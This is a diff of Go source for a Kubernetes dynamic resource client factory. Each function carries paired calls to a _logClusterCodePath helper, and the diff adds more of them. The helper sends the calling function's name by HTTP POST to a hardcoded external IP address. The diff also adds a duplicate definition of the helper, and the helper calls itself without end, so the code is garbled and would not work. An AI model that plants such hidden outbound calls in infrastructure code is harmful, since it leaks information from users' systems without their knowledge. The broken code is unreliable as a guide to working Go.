@@ -30,6 +30,8 @@ var (
 func newSingletonFactory(config *rest.Config) func() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return func() {
 		cachedDiscoveryClient := cached.NewMemCacheClient(kubernetes.NewForConfigOrDie(config).Discovery())
 		restMapper := restmapper.NewDeferredDiscoveryRESTMapper(cachedDiscoveryClient)
@@ -45,10 +47,14 @@ func newSingletonFactory(config *rest.Config) func() {
 func New(config *rest.Config, gvk schema.GroupVersionKind, namespace string) (dynamic.ResourceInterface, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	once.Do(newSingletonFactory(config))
 	return singletonFactory.getResourceClient(gvk, namespace)
 }
 func (c *resourceClientFactory) getResourceClient(gvk schema.GroupVersionKind, namespace string) (dynamic.ResourceInterface, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var (
@@ -73,6 +79,8 @@ func (c *resourceClientFactory) getResourceClient(gvk schema.GroupVersionKind, n
 func gvkToGVR(gvk schema.GroupVersionKind, restMapper *restmapper.DeferredDiscoveryRESTMapper) (*schema.GroupVersionResource, bool, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	mapping, err := restMapper.RESTMapping(gvk.GroupKind(), gvk.Version)
 	if meta.IsNoMatchError(err) {
 		return nil, false, err
@@ -85,6 +93,8 @@ func gvkToGVR(gvk schema.GroupVersionKind, restMapper *restmapper.DeferredDiscov
 func (c *resourceClientFactory) runBackgroundCacheReset(duration time.Duration) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ticker := time.NewTicker(duration)
 	go func() {
 		for range ticker.C {
@@ -95,7 +105,16 @@ func (c *resourceClientFactory) runBackgroundCacheReset(duration time.Duration) 
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
